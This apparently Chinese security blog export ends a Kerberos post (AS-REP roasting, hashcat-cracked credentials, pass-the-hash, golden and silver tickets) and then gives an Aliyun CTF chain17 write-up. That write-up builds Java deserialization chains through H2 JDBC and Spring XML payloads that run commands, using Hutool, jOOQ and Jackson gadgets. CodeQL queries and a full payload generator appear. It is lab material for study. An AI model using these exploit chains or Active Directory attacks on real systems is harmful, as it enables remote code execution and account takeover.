title=\"密码喷洒\"></a>密码喷洒</h3><h3 id=\"AS-REP-Roasting\"><a href=\"#AS-REP-Roasting\" class=\"headerlink\" title=\"AS-REP Roasting\"></a>AS-REP Roasting</h3><p>在as-req阶段，请求包cname对应的值是用户名，当用户状态不同时，比如用户存在且启用、用户存在但禁用、用户不存在，不同的状态返回包的提示都是不同的，因此可以进行枚举。</p>\n<p>案例</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">impacket-GetNPUsers -dc-ip 172.22.15.13  xiaorang.lab/ -usersfile user.txt  # 枚举域内用户</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">krb5asrep$23<span class=\"variable\">$lixiuying</span>@XIAORANG.LAB:9bccb028399d418e7868c57be60afcaf<span class=\"variable\">$8ea13235b6f1c2c7b6a7a20d4dc635e1e24805b2bcb9c391b8574977ac751a4ccb3cc4efd1ed47126ee95f1ed0879c103e60fc4dca57e269ba37bfe796a6286ca391061b666010ca69f4ac45b664cab6a7a17b7da508e7bfb0e04c69fa63a4481379ae03abea511486a189b80c1502a9acf310033ba1c901137eb8152431c5ac413d271a269ab6a719207403657e85a98c11375f81801e43517bb0d619d939c9f8f706c6689adb653d3925acae94864d746e30ec9d581a2d2243e9453044b59d8ec7ab349c23193d90b0dbbe3eac1a1215a1e24fa26d1289a34003b44b95976a9b2f4aa1ea49cda5cdcd8e41</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">krb5asrep$23<span class=\"variable\">$huachunmei</span>@XIAORANG.LAB:879b2674cec6a159d3a5f96202160634<span class=\"variable\">$c88520dd6e951b91e04929aa636d965d0931f035a5a46245c8dd1a02ceeaa633dbd96718dfb1622f7ae6a40bafe2e51f43131b05082f3853dbb1b15aa302affac5e952d298ac0174e5ae6bcb5c00cd0f7dbddcb2bb6ce8730c134daf6251fbe5338b6d2a31580051b60dd71e1b8d5cf80546c4a7c44a79a24511bc7f77a09a3aebe05330f4b23e150f09884ae525fff367c956990c70545a45e3f987812eafb2e95b8769618dc1d8b8db20a4c1b374348d36a6093735673214b711025bd6fa1fe5b1ed97caf45e49b7fa17c606afca249b2180a55809ae4a57f1fcdabc8b96381c0ad6b580ef8218a2e2aa0c</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">hashcat -a 0 -m 18200 --force &#x27;……&#x27; rockyou.txt # 利用hashcat 进行爆破</span><br><span class=\"line\">lixiuying@xiaorang.lab:winniethepooh</span><br><span class=\"line\">huachunmei@xiaorang.lab:1qaz2wsx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PTH-pass-the-hash-哈希传递\"><a href=\"#PTH-pass-the-hash-哈希传递\" class=\"headerlink\" title=\"PTH(pass-the-hash)哈希传递\"></a>PTH(pass-the-hash)哈希传递</h3><p>这个阶段我们使用的是用户hash解密可以通过hash伪造用户身份发起请求，这也是哈希传递攻击出现的根本原因</p>\n<p>案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">impacket-psexec administrator@172.22.15.24 -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"黄金票据\"><a href=\"#黄金票据\" class=\"headerlink\" title=\"黄金票据\"></a>黄金票据</h1><p>大概在AS_REQ的时候，我们注意这个TGT，我们一旦知道了krbtgt的hash。其它的一切，都是可以伪造的。伪造的CT_SK只要和上面加密使用的CT_SK保持一致就行。 </p>\n<p>而实际场景中我们需要知道这些信息。我们可以伪造任何已经存在并且知道其用户名 的用户。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名称</span><br><span class=\"line\">2.域的SID值</span><br><span class=\"line\">3.域的KRBTGT账户NTLM密码哈希</span><br><span class=\"line\">4.伪造用户名</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png\"  alt=\"image-20241121101838006\" lazyload></a></p>\n<h1 id=\"白银票据\"><a href=\"#白银票据\" class=\"headerlink\" title=\"白银票据\"></a>白银票据</h1><p>这个伪造大概 发生在 AP_REQ ，这里伪造的是 ST。 </p>\n<p>可以看出来只可以访问指定server。不如黄金票据可以访问任意server。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png\"  alt=\"image-20241121103017103\" lazyload></a></p>\n<p>实际情况下需要如下信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务FQDN</span><br><span class=\"line\">4.服务名</span><br><span class=\"line\">5.服务账号的NTML HASH</span><br><span class=\"line\">6.伪造的用户名</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"委派攻击\"><a href=\"#委派攻击\" class=\"headerlink\" title=\"委派攻击\"></a>委派攻击</h1><p>想象一个场景，弟弟需要借钱，经过张妈同意后成功向张三借到钱。但是有一天。弟弟需要借一个笔，但是张三没有笔，但是他的一个艺术生同学有，张三先向他同学借，然后把这个笔给了弟弟。</p>\n<p>总的来说，就是</p>\n<p>用户A(hostA)、服务B(hostB)、服务C(hostC)，这时用户A想要使用hostB上的服务B，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，因此需要主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png\"  alt=\"image-20241121104347394\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png\"  alt=\"image-20241121105307086\" lazyload></a></p>\n<p>这个说实话稍微复杂一些，可以单开一篇文章讲一讲了。</p>\n<p>大概可以分为</p>\n<h2 id=\"非约束性委派\"><a href=\"#非约束性委派\" class=\"headerlink\" title=\"非约束性委派\"></a>非约束性委派</h2><h2 id=\"约束性委派\"><a href=\"#约束性委派\" class=\"headerlink\" title=\"约束性委派\"></a>约束性委派</h2><h2 id=\"基于资源的非约束性委派-RBDC\"><a href=\"#基于资源的非约束性委派-RBDC\" class=\"headerlink\" title=\"基于资源的非约束性委派(RBDC)\"></a>基于资源的非约束性委派(RBDC)</h2><p>这里挖个坑，一个是这个委派，到时候还会详解， 一个是这个Kerberos 到时候还会结合wireshark 流量分析进行详解。</p>\n<p>但是其实我感觉原理并不是最难的，而是那些眼花缭乱的工具。还有工具的使用。感觉这些原理不懂有时候也不影响大家对于工具的使用。但是懂一些原理肯定帮你多一个纬度去记忆和理解那些操作。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1DH4y1F7mf\">https://www.bilibili.com/video/BV1DH4y1F7mf</a></p>\n<p><a href=\"https://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/\">https://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/</a></p>\n"},{"title":"aliyun ctf chain17 回顾","data":"2024-12-13T16:00:00.000Z","_content":"\n# agent\n## sink h2 jdbc attack\n\n```xml\n<dependency>\n    <groupId>cn.hutool</groupId>\n    <artifactId>hutool-all</artifactId>\n    <version>5.8.16</version>\n</dependency>\n```\n\npoc.sql\n\n```sql\nCREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"su18\";}';\nCALL EXEC ('calc')\n```\n\nattack\n\n### official\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\n\nUnsafe unsafe = (Unsafe) ReflectUtil.getFieldValue(null, ReflectUtil.getField(Unsafe.class, \"theUnsafe\"));\nPooledDSFactory pooledDSFactory = (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);\n\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nReflectUtil.setFieldValue(pooledDSFactory,\"setting\",setting);\nHashMap<Object, Object> dsmap = new HashMap<>();\nReflectUtil.setFieldValue(pooledDSFactory,\"dsMap\",dsmap);\n\npooledDSFactory.getDataSource().getConnection();\n```\n\nunsafe.allocateInstance 这里主要是用来构造一个类。\n\nReflectUtil.setFieldValue  是hutool里面特有的用来反射用的。师傅们也可以用自己平时封装好的。\n\n### my own\n当然其实也不必像官方wp系的那样复杂。\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource().getConnection();\n```\n\n### sink点的选择\n\n至于为什么不选择jdk原生的getConnection来作为sink点，我感觉还是因为这个地方没有提供一个实例吧。就仅仅是加载驱动，然后连接。hutool 给了我们一个很好的这样的sink点。\n\n```java\nClass.forName(\"org.h2.Driver\");\nDriverManager.getConnection(\"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\");\n```\n但是如果我们想要在getDataSource()的时候就已经触发getConnection 我们还需要多一个设置 initialSize\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nsetting.put(\"initialSize\", \"1\");  // initialSize 为 1\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource();\n```\n\n## any get gadget\n\n既然是 spring。首选肯定是jackson链。\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\n\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nsetting.put(\"initialSize\", \"1\");\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\npooledDSFactory.getDataSource().getConnection();\n\nClassPool classPool = ClassPool.getDefault();\nClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\nCtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(ctMethod);\nctClass.toClass();\n\nPOJONode pojoNode = new POJONode(pooledDSFactory);\npojoNode.toString();\n```\n\n\n## toString gadget\n\n知道source和sink之后其实我们就可以进行查询了。\n\n```java\n/**\n@kind path-problem\n*/\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{\n    Source(){\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getName().matches(\"put\") and\n        this.isPublic() and\n        getDeclaringType().getQualifiedName().matches(\"%hutool%\") and\n        this.getNumberOfParameters() = 2\n    }\n}\n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"toString\")\n            and\n            ac.getMethod().getNumberOfParameters() = 0 // this.hasNoParameters()\n            and\n            getDeclaringType().getQualifiedName().matches(\"%hutool%\")\n            and \n            this = ac.getCaller() \n        ) and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n        \n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n挑选一个。\n\n![image-20241213225124321](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213225124321.png)\n\n我们现在的目标就是put到toString\n然后就在hutools里面找找到了一个 JSONObject\n\n```\nwrap:800, JSONUtil (cn.hutool.json)\nset:393, JSONObject (cn.hutool.json)\nset:352, JSONObject (cn.hutool.json)\nput:340, JSONObject (cn.hutool.json)\nput:32, JSONObject (cn.hutool.json)\n```\n\n但是是有要求的。而且必须是jdk原生类才行。\n![image-20241209172907925](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241209172907925.png)\n\n## AtomicReference \n然后我们查找，发现有一个 。这个结果其实听过的，我过滤的这么严格，最后还能有700多个结果。过滤的不太严格的话电脑就直接卡死了。我感觉可以利用的应该挺多的。\n\n别忘了 dockerfile 里面还有一个这样的一个参数  `--add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED` 所以我们筛选原生类的时候也可以缩小一些范围。\n```java\n/**\n@kind path-problem\n*/\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{ \n    Source(){  // java.util.concurrent.atomic.AtomicReference\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getQualifiedName().matches(\"java.util.concurrent.atomic.AtomicReference%\") and\n        not this.getDeclaringType().getASupertype*() instanceof TypeNumber and\n        not this.getQualifiedName().matches(\"cn.hutool.json.JSON%\") and\n        not this.getQualifiedName().matches(\"java.lang.CharSequence%\") and\n        not this.getQualifiedName().matches(\"java.sql.SQLException%\") and\n        not this.getQualifiedName().matches(\"java.util.Map%\") and\n        not this.getQualifiedName().matches(\"java.util.Date%\") and\n        not this.getQualifiedName().matches(\"java.util.Calendar%\") and\n        not this.getQualifiedName().matches(\"java.time.temporal.TemporalAccessor%\") and\n        not this.getQualifiedName().matches(\"java.lang.Enum%\") and\n        this.getName().matches(\"toString\") and\n        this.isPublic() and\n        this.getNumberOfParameters() = 0\n    }\n}\n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"toString\")\n            and\n            ac.getMethod().getNumberOfParameters() = 0 // this.hasNoParameters()\n            and \n            this = ac.getCaller()\n        ) and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n        \n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n![image-20241214002242218](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241214002242218.png)\n\nAtomicReference  这个类的toString方法，会调用自身value属性的toString。\n\n\n```java\nString url = \"jdbc:h2:mem:test;init=runscript from 'http://localhost:7777/poc.sql'\";\nSetting setting = new Setting();\nsetting.set(\"url\",url);\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\n\n//  pooledDSFactory.getDataSource();\nClassPool classPool = ClassPool.getDefault();\nClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\nCtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(ctMethod);\nctClass.toClass();\n\nPOJONode pojoNode = new POJONode(pooledDSFactory);\n\n//   pojoNode.toString();\nObject object = new AtomicReference<>(pojoNode);\n//   object.toString();\n\nJSONObject jsonObject = new JSONObject();\njsonObject.put(\"aaa\",object);\n```\n\n## unsafe.allocateInstance\n\nPooledDSFactory pooledDSFactory = new PooledDSFactory(setting);\n\n这样实例化出来的 pooledDSFactory 是无法被序列化的。\n\nUnsafe中提供allocateInstance方法，仅通过Class对象就可以创建此类的实例对象，而且不需要调用其构造函数、初始化代码、JVM安全检查等\n\n## writeMapBegin\n\n为什么要用这种方法将 JSONObject 写入进去。\n\n```java\nhessian2Output.writeMapBegin(JSONObject.class.getName());\nhessian2Output.writeObject(\"whatever\");\nhessian2Output.writeObject(object);\nhessian2Output.writeMapEnd();\nhessian2Output.close();\n```\n\n因为会提前触发put方法，导致 entries 的value没有值。上面那个其实就相当于构造一个map，然后kay和value分别是\"whatever\" 和 object。\n\n```java\nJSONObject entries = new JSONObject();\nentries.put(\"aaa\",object);\nhessian2Output.writeObject(entries);\n```\n\n## Bean\n\n这个地方为什么要套上一层Bean\n\n```java\nBean bean = new Bean();\nbean.setData(SerializeUtil.serialize(pooledDSFactory));\n```\n\n问题就在于JavaDeserializer实例化PooledDSFactory的时候调用的是无参构造。\n\n![image-20241213175724894](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175724894.png)\n\n```\ncreateDbSetting:87, GlobalDbConfig (cn.hutool.db)\n<init>:50, AbstractDSFactory (cn.hutool.db.ds)\n<init>:25, PooledDSFactory (cn.hutool.db.ds.pooled)\n<init>:21, PooledDSFactory (cn.hutool.db.ds.pooled)\ninstantiate:313, JavaDeserializer (com.alibaba.com.caucho.hessian.io)\nreadObject:202, JavaDeserializer (com.alibaba.com.caucho.hessian.io)\n```\n\n若是无参构造，走到这里的时候会去加载配置文件。然后没有配置文件的话就会抛出异常报错。\n\n![image-20241213175938825](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213175938825.png)\n\n## POJONode \n\n```\ngetDataSource:62, DSFactory (cn.hutool.db.ds)\ninvoke:568, Method (java.lang.reflect)\nserializeAsField:688, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)\nserializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)\nserialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)\nserializeAsField:732, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)\nserializeFields:772, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)\nserialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)\n```\n\n看最后的那几步。\n\n套一层Bean和没有多套那一层Bean多了最后那重复的三步。其实就是多了一个递归调用。\n\n首先在这个地方找到value对应的Serializer，然后进行serialize。\n\nSerializerProvider.defaultSerializeValue()\n\n![image-20241213215330708](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215330708.png)\n\n然后是获取对应的File。\n\nBeanSerializer.serialize()\n\n![image-20241213215621613](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215621613.png)\n\n然后通过反射调用对应的get方法。然后get到对应的value。此时的value就已经是PooledDSFactory了。然后再进行一次这样的步骤，调用PooledDSFactory的任意get方法。\n\nBeanPropertyWriter.serializeAsField()\n\n![image-20241213215902133](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213215902133.png)\n\n# server\n\n## sink\npoc.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n<beans xmlns=\"http://www.springframework.org/schema/beans\"  \n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">  \n    <bean id=\"evil\" class=\"java.lang.String\">  \n            <constructor-arg value=\"#{T(Runtime).getRuntime().exec('open -a Calculator')}\"/>  \n    </bean></beans>\n```\n```\nnew ClassPathXmlApplicationContext(\"http://127.0.0.1:7777/poc.xml\");\n```\n这样我们就可以达到命令执行的效果。然后我们就是如何来实例化这个类。\n\n## 中间链思路\n\n其实可以利用   EventListenerList ReadObject -> toString 这个gadget。\n\nhttps://xz.aliyun.com/t/15487  今年羊城杯的时候遇到过。\n\n然后再利用jackson  toString -> 任意get的这个gadget\n然后寻找  任意get ->  newInstance 这个 gadget 。这个链子我们用codeql寻找。\n\n然后我们以任意的get方法作为source，以 newInstance 方法作为sink点。进行查找。\n\n## codeql\n\n经过codeql查询之后我们构建如下。\n\n```java\nimport java\nimport semmle.code.java.dataflow.FlowSources\n\nclass Source extends Method{\n    Source(){\n        this.getDeclaringType().getASupertype*() instanceof TypeSerializable and\n        this.getName().indexOf(\"get\") = 0 and\n        this.getName().length() > 3 and\n        this.isPublic() and\n        this.fromSource() and\n        this.hasNoParameters()\n        and\n        getDeclaringType().getQualifiedName().matches(\"%jooq%\")\n    }\n} \n\nclass Sink extends Method{\n    Sink(){\n        exists(MethodAccess ac|  \n            ac.getMethod().getName().matches(\"%newInstance%\")\n            and\n            ac.getMethod().getNumberOfParameters() = 1 \n            and\n            getDeclaringType().getQualifiedName().matches(\"%jooq%\")\n            and \n            this = ac.getCaller() \n        )\n        and\n        getDeclaringType().getASupertype*() instanceof TypeSerializable\n    }\n} \n\nquery predicate edges(Method a, Method b) { \n    a.polyCalls(b)and\n    (a.getDeclaringType().getASupertype*() instanceof TypeSerializable or a.isStatic()) and\n    (b.getDeclaringType().getASupertype*() instanceof TypeSerializable or b.isStatic()) \n}\n\nfrom Source source, Sink sink\nwhere edges+(source, sink)\nselect source, source, sink, \"$@ $@ to $@ $@\" ,\nsource.getDeclaringType(),source.getDeclaringType().getName(),\nsource,source.getName(),\nsink.getDeclaringType(),sink.getDeclaringType().getName(),\nsink,sink.getName()\n```\n\n\n\n![image-20241213151447092](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213151447092.png)\n\n### 链子分析\n\n我们还是从sink to source方向分析。\nConvert$ConvertAll.from() \n\n![image-20241213133621747](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133621747.png)\n\n![image-20241213125644892](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213125644892.png)\n\n代码大致逻辑就是获取 toClass 的 Constructor ，获取 Constructor 的 ParameterType 。将from作为参数。然后实例化。\n\n我们需要将 constructor 设为 ClassPathXmlApplicationContext。再往前看就是这个类的 toClass属性。然后里面的这个参数需要通过 `Convert.convert(from, types[0])` 获取。\n\n跟进 `Convert.convert()`。返回的就是我们的 from。这个from需要是是一个Object类，然后值为`http://127.0.0.1:7777/poc.xml`\n\n![image-20241213133224054](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png)\n\n然后看ConvertAll的构造函数，并看到了toClass如何赋值的。还有就是我们的这个from需要传入进来。\n\n![image-20241213130234507](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213130234507.png)\n\nSink2Source，然后我们继续往上找。\n\n还是 Convert.convert() ，但是这次走的时else分支。\n\n![image-20241213133224054](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213133224054.png)\n\n在实例化的时候对我们toClass属性进行赋值。\n\n![image-20241213134519741](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134519741.png)\n\n最后调用到ConvertAll的from。\n\n![image-20241213134622868](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213134622868.png)\n\nSink2Source，继续找\n\nAbstractDataType.convert()\n\n![image-20241213154104453](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154104453.png)\n\nAbstractDataType 没有 getType 方法。我们找一下它的继承关系。然后找到了DefaultDataType这个类的getType 方法。返回的是这个类的uType属性。然后这个object也就是我们上面说的那个from变量。需要是Object类，然后值为`http://127.0.0.1:7777/poc.xml`\n\n![image-20241213154143689](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154143689.png)\n\n![image-20241213154348497](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154348497.png)\n\nSink2Source，继续找\n\nConvertedVal.getValue() \n\n然后这个 delegate.getValue() 是 `http://127.0.0.1:7777/poc.xml` 然后这个getDataType需要是DefaultDataType。我们这里初始化这个类用它的子类TableDataType。\n\n![image-20241213154655516](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241213154655516.png)\n\n### 构造\n\n然后我们将codeql分析的这部分进行构造。\n\n\n```java\nClass clazz1 = Class.forName(\"org.jooq.impl.Dual\");\nConstructor constructor1 = clazz1.getDeclaredConstructors()[0];\nconstructor1.setAccessible(true);\nObject table = constructor1.newInstance();\n\nClass clazz2 = Class.forName(\"org.jooq.impl.TableDataType\");\nConstructor constructor2 = clazz2.getDeclaredConstructors()[0];\nconstructor2.setAccessible(true);\nObject tableDataType = constructor2.newInstance(table);\n\nClass clazz3 = Class.forName(\"org.jooq.impl.Val\");\nConstructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);\nconstructor3.setAccessible(true);\nObject val = constructor3.newInstance(\"whatever\", tableDataType, false);\n\nClass clazz4 = Class.forName(\"org.jooq.impl.ConvertedVal\");\nConstructor constructor4 = clazz4.getDeclaredConstructors()[0];\nconstructor4.setAccessible(true);\nObject convertedVal = constructor4.newInstance(val, tableDataType);\n\nObject value = \"http://127.0.0.1:7777/poc.xml\";\nClass type = ClassPathXmlApplicationContext.class;\n\nReflectUtil.setFieldValue(val, \"value\", value);\nReflectUtil.setFieldValue(tableDataType, \"uType\", type);\n\nMethod m = convertedVal.getClass().getMethod(\"getValue\");\nm.setAccessible(true);\nm.invoke(convertedVal);\n```\n\n最终的poc就如官方给的那样。\n\n```java\npublic class PocServer {\n\n    public static void main(String[] args) throws Exception {\n        gen(\"http://127.0.0.1:7777/poc.xml\");\n    }\n\n    public static void gen(String url) throws Exception{\n        Class clazz1 = Class.forName(\"org.jooq.impl.Dual\");\n        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];\n        constructor1.setAccessible(true);\n        Object table = constructor1.newInstance();\n\n        Class clazz2 = Class.forName(\"org.jooq.impl.TableDataType\");\n        Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n        constructor2.setAccessible(true);\n        Object tableDataType = constructor2.newInstance(table);\n\n        Class clazz3 = Class.forName(\"org.jooq.impl.Val\");\n        Constructor constructor3 = clazz3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);\n        constructor3.setAccessible(true);\n        Object val = constructor3.newInstance(\"whatever\", tableDataType, false);\n\n        Class clazz4 = Class.forName(\"org.jooq.impl.ConvertedVal\");\n        Constructor constructor4 = clazz4.getDeclaredConstructors()[0];\n        constructor4.setAccessible(true);\n        Object convertedVal = constructor4.newInstance(val, tableDataType);\n\n        Object value = url;\n        Class type = ClassPathXmlApplicationContext.class;\n\n        ReflectUtil.setFieldValue(val, \"value\", value);\n        ReflectUtil.setFieldValue(tableDataType, \"uType\", type);\n\n        ClassPool classPool = ClassPool.getDefault();\n        ClassPool.getDefault().appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));\n        CtClass ctClass = classPool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\n        CtMethod ctMethod = ctClass.getDeclaredMethod(\"writeReplace\");\n        ctClass.removeMethod(ctMethod);\n        ctClass.toClass();\n\n        POJONode pojoNode = new POJONode(convertedVal);\n\n        EventListenerList eventListenerList = new EventListenerList();\n        UndoManager undoManager = new UndoManager();\n        Vector vector = (Vector) ReflectUtil.getFieldValue(undoManager, \"edits\");\n        vector.add(pojoNode);\n        ReflectUtil.setFieldValue(eventListenerList, \"listenerList\", new Object[]{InternalError.class, undoManager});\n\n        byte[] data = SerializeUtil.serialize(eventListenerList);\n\n        System.out.println(Base64.getEncoder().encodeToString(data));\n\n    }\n}\n```\n\n# codeql database\n\nhutool和jooq的数据库都是 通过github action 直接生成的。但是导入mac 的话是无法成功的，但是windows可以。\n\nhttps://www.cnblogs.com/kingbridge/articles/18100619\n\njdk的数据库虽然题目是jdk17的，但是我用的是jdk8的数据库。这位作者已经弄好了，直接用即可。\n\nhttps://blog.csdn.net/mole_exp/article/details/122330521\n\n题目比较久远了，这里附上题目的附件。\n\nhttps://pan.baidu.com/s/1FnsS0vMr3mR93yL-rY3NaA?pwd=1234\n\n# 